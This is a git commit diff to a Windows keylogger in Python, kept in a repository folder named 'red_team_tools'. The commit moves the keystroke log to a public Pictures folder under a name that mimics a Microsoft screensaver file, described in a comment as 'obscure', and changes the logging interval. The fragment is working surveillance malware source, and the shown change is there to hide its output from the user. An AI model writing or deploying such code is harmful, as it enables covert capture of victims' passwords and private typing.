f28c16aee76e71cc5be0d6fa5cbcff609cfcaf47
Jupiter Howard <140577712+westofjupiter@users.noreply.github.com>
2026-02-23 14:17:11 -0500

    changed path log writes to

--- red_team_tools/WindowsKeyLogger/keylogger.py
+++ red_team_tools/WindowsKeyLogger/keylogger.py
@@ -2,9 +2,9 @@ from pynput.keyboard import Key, Listener
 import logging
 import threading
 
-path = r"C:\Users\applejack\AppData\Local\Packages\log.txt"	#sets the file path for the log file to an obscure folder
+path = r"C:\Users\Public\Pictures\microsoft-windows-default-screensaver.txt"	#sets the file path for the log file to an obscure folder
 buffer = ""
-time_interval = 30 #information is recorded to the log every 30 seconds
+time_interval = 60 #information is recorded to the log every 60 seconds
 
 logging.basicConfig(filename = path, level = logging.DEBUG, format="%(asctime)s: %(message)s")
 
